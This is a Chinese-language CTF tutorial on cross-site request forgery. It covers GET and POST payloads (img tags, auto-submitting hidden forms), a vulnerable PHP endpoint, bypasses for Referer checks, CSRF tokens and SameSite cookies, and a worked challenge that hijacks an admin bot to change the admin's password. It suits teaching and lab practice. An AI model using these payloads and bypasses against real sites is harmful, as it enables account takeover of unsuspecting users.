---
comments: true
---

# CSRF攻击

## 什么是 CSRF

CSRF（Cross-Site Request Forgery，跨站请求伪造）的核心思想只有一句话：**浏览器在发起请求时会自动携带目标站点的 Cookie，攻击者无法读取这个 Cookie，但可以"借用"它**。

假设你已经登录了 `http://bank.example.com`，浏览器里存着这个站点的会话 Cookie。此时你访问了攻击者的页面 `http://evil.com`，这个页面里藏着一段代码，悄悄向 `bank.example.com` 发起了一个"转账"请求。浏览器在发请求时，会按照 Cookie 的作用域规则自动把 `bank.example.com` 的 Cookie 带上——对服务器来说，这就是一个"已登录用户发起的合法请求"，于是转账被执行了。

整个过程中攻击者：

- 不知道你的 Cookie 内容（受同源策略保护，读不到）；
- 不需要你输入任何密码；
- 只需要让你 **浏览器** 发出那个请求就够了。

所以 CSRF 成立需要三个条件：

1. 目标站点用 Cookie（或其他浏览器自动携带的凭证）做身份认证；
2. 敏感操作的请求参数 **完全可以预测**（没有一次性 Token 之类的随机值）；
3. 受害者被诱导访问了攻击者的页面（点击链接、打开恶意站点等）。

注意 CSRF 和 XSS 的区别：XSS 是攻击者的脚本跑在 **目标站点** 里，可以为所欲为；CSRF 是攻击者的页面跑在 **自己的站点** 里，只能"借"浏览器发请求，看不到响应内容。关于 XSS 的详细内容可参考「XSS攻击」章节。

## GET 型与 POST 型 CSRF 的构造

CSRF 的 payload 本质上就是一个会自动发出的 HTTP 请求，按请求方法分为两类。

### GET 型 CSRF

如果敏感操作通过 GET 请求触发（这本身就违反 HTTP 语义，但 CTF 里很常见），构造起来最简单——任何能加载 URL 的标签都能用：

```html
<!-- 利用 img 标签的 src 发起 GET 请求，受害者打开页面即触发 -->
<img src="http://victim.com/change_password.php?newpass=hacked" />

<!-- 也可以伪装成普通链接诱导点击 -->
<a href="http://victim.com/admin/add_user.php?name=attacker&role=admin">点我抽奖</a>
```

浏览器加载 `<img>` 时会向 `src` 发起 GET 请求并自动携带 Cookie。图片加载失败也没关系，请求已经发出去了。

### POST 型 CSRF

敏感操作通常要求 POST。`<img>` 发不了 POST，但 **表单可以**。经典手法是写一个隐藏表单，页面加载后自动提交：

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://victim.com/change_password.php" method="POST">
      <input type="hidden" name="newpass" value="hacked" />
      <input type="hidden" name="confirm" value="hacked" />
    </form>
  </body>
</html>
```

要点：

- 所有字段用 `type="hidden"`，受害者看不到任何内容；
- `onload` 或一段 `<script>document.forms[0].submit()</script>` 让表单 **自动提交**，无需用户交互；
- 表单提交不受同源策略限制（HTML 表单本来就允许跨站提交），浏览器同样会自动带上目标站点的 Cookie。

如果参数必须是 JSON 格式（`Content-Type: application/json`），表单无法直接伪造该 Content-Type，此时一般要配合其他手段（如 Flash、CORS 配置错误），CTF 中较少见，了解即可。

## CTF 中的典型考法

### 考法一：修改管理员密码 / 添加管理员

题目给你一个普通用户账号，以及一个"管理员会查看你提交的内容"的设定。目标站存在类似这样的漏洞接口：

```php
<?php
// change_password.php —— 典型的无防护实现
session_start();
if (!isset($_SESSION['username'])) {
    die('not login');
}
$newpass = $_REQUEST['newpass'];
// 直接改当前登录用户的密码，没有校验 CSRF Token、没有校验 Referer
$db->query("UPDATE users SET password='$newpass' WHERE username='{$_SESSION['username']}'");
echo 'ok';
```

你的解法就是构造一个自动提交的表单，想办法让管理员（通常是一个定时访问你提交页面的 Bot）触发它：

```html
<form action="http://victim.internal/change_password.php" method="POST" id="f">
  <input type="hidden" name="newpass" value="my_new_password" />
</form>
<script>document.getElementById('f').submit();</script>
```

Bot 以管理员身份访问了你的页面 → 表单自动提交 → Bot 浏览器带着管理员的 Cookie 发出改密请求 → 管理员的密码被改成你知道的值，直接登录拿 flag。

### 考法二：配合 XSS Bot 解题

很多 CTF 题会内置一个 XSS Bot（也叫 Admin Bot）：你提交一个 URL 或一段 HTML，Bot 会以管理员身份、带着含 flag 的 Cookie 去访问它。

这类题的 CSRF 思路是：

1. 找到一个无防护的敏感接口（改邮箱、加管理员、发布文章、转账……）；
2. 构造 CSRF payload 页面，托管在你能控制的地方（或者利用站内 XSS / HTML 注入点直接把 payload 塞进目标站）；
3. 把 URL 提交给 Bot，让它替你把请求发出去。

和「XSS攻击」章节中"用 XSS 偷 Cookie"的思路对比着看会更清楚：

- **XSS 路线**：脚本跑在目标站域内，可以直接 `fetch` 敏感接口并读回响应，也能读 Cookie（如果没有 `HttpOnly`）；
- **CSRF 路线**：脚本跑在站外，只能 **发出** 请求但读不到响应。所以 CSRF 适合"状态改变型"操作（改密码、加管理员），不适合"偷数据型"操作。

实战中两者常配合使用：先用 XSS 在目标站内嵌一个 CSRF 表单，或直接利用 XSS 读出页面里的 CSRF Token 再伪造完整请求——一旦有了 XSS，CSRF 的所有防御基本都不成立。

## 防御机制与绕过思路

### Referer / Origin 校验

服务器检查请求的 `Referer`（或 `Origin`）头是否来自本站：

```php
if (strpos($_SERVER['HTTP_REFERER'] ?? '', 'victim.com') !== 0) {
    die('csrf detected');
}
```

**常见绕过**：

- 校验逻辑写得不严：`strpos(..., 'victim.com')` 只要不是第 0 位就拒绝？那用 `http://victim.com.evil.com` 或 `http://evil.com/victim.com.html` 即可绕过；
- `Referer` 为空时直接放行：可以用 `<meta name="referrer" content="no-referrer">` 让浏览器不发送 Referer 头；
- 只检查存在性（`isset`）而不检查内容，等于没防。

### CSRF Token

主流防御：服务器在表单里嵌入一个与会话绑定的随机 Token，提交时校验：

```html
<form action="/change_password.php" method="POST">
  <input type="hidden" name="csrf_token" value="a8f3b2c1..." />
  ...
</form>
```

攻击者在站外无法获知这个随机值，伪造的请求自然通不过校验。

**常见绕过**：

- Token 只在"存在时"校验，删掉参数就跳过：`change_password.php?newpass=hacked`（不带 `csrf_token`）直接通过；
- Token 与 Session 未绑定：用 **自己账号** 的合法 Token 提交给受害者用；
- Token 可预测（时间戳、弱随机数）；
- 站点存在 XSS：直接读页面里的 Token，防御失效（再次体现 XSS 与 CSRF 的关系）。

### SameSite Cookie

浏览器级别的防御：设置 Cookie 时加上 `SameSite` 属性，控制跨站请求是否携带 Cookie。

```http
Set-Cookie: session=abc123; SameSite=Lax
```

- `SameSite=Strict`：任何跨站请求都不携带该 Cookie，最严格；
- `SameSite=Lax`（现代浏览器默认值）：跨站的 **顶层导航 GET**（如点击链接）会携带，跨站 POST 表单、`img`、`fetch` 不携带——基本能挡住大多数 CSRF；
- `SameSite=None`：跨站携带（必须同时加 `Secure`），等于不防。

**绕过思路**：

- 若站点 Cookie 没有显式设置 SameSite，且浏览器版本较旧（默认 `None`），照常打；
- `Lax` 只挡跨站 POST：如果敏感接口同时接受 GET 请求，改用 GET 型 CSRF 即可绕过；
- 子域名或同站（same-site）请求不受 SameSite 限制：找一个同站下的 XSS / 跳转点发起请求。

## 完整例题：CSRF 修改管理员密码

**题目描述**：某站点有两个接口——`POST /feedback` 可以让管理员 Bot 访问你提交的 URL；`GET/POST /admin/change_password.php?password=xxx` 用于当前登录用户修改密码，无任何 CSRF 防护。你有一个普通账号，flag 在管理员的后台里。

### 第一步：摸清目标接口

用自己的账号登录，在正常改密码时抓包：

```http
POST /admin/change_password.php HTTP/1.1
Host: victim.challenge.local
Cookie: session=你的会话
Content-Type: application/x-www-form-urlencoded

password=test123
```

响应返回 `success`，重新登录确认密码已被修改。注意两个关键点：

- 请求里没有任何 Token 参数；
- 接口对 GET 也有效（`GET /admin/change_password.php?password=xxx` 同样返回 success）——很多题目会"顺手"同时支持两种方法。

结论：存在 CSRF，且 GET/POST 都可利用。

### 第二步：构造 payload

起一个自己能控制 HTTP 服务的地方（CTF 里常用自己的 VPS，或题目提供的 webhook/托管服务），放一个页面：

```html
<!DOCTYPE html>
<html>
<body>
  <form id="f" action="http://victim.challenge.local/admin/change_password.php" method="POST">
    <input type="hidden" name="password" value="pwned_123456" />
  </form>
  <script>
    document.getElementById('f').submit();
  </script>
</body>
</html>
```

既然 GET 也可用，更省事的做法是直接用一个 `<img>`：

```html
<img src="http://victim.challenge.local/admin/change_password.php?password=pwned_123456" />
```

### 第三步：让 Bot 触发

通过 `POST /feedback` 提交你 payload 页面的 URL：

```bash
curl -X POST http://victim.challenge.local/feedback \
  -d "url=http://你的服务器/exp.html"
```

Bot 以管理员会话访问 `exp.html` → 页面里的表单自动向 `change_password.php` 提交 → 浏览器自动携带管理员的 Cookie → 管理员密码被改为 `pwned_123456`。

### 第四步：登录拿 flag

用 `admin / pwned_123456` 登录后台，读取 flag。

### 复盘

这道题覆盖了 CSRF 题的完整链路：

1. **识别**：敏感接口参数完全可预测、无 Token、无 Referer 校验 → 存在 CSRF；
2. **构造**：auto-submit 表单（POST 型）或 `<img>`（GET 型）；
3. **投递**：借助题目给的 Admin Bot 触发；
4. **利用**：CSRF 做"改状态"操作（改密码），而不是"偷数据"。

如果题目加了 CSRF Token 但存在 XSS 注入点，思路就切换为：用 XSS 读取页面中的 Token 再发请求——这就是「XSS攻击」章节内容的延伸应用，建议对照阅读。

## 小结

- CSRF 的本质：浏览器自动携带 Cookie，攻击者"借"会话发请求；
- GET 型用 `<img>`/`<a>`，POST 型用 auto-submit 隐藏表单；
- CTF 里通常配合 Admin Bot，目标多为改密码、加管理员等"改状态"操作；
- 防御三板斧：Referer 校验、CSRF Token、SameSite Cookie，各有常见绕过，但都难以抵挡 XSS；
- 拿到 CSRF 题先抓包看参数是否可预测，再看 Token 校验是否严格，最后考虑 SameSite 下能否改用 GET。
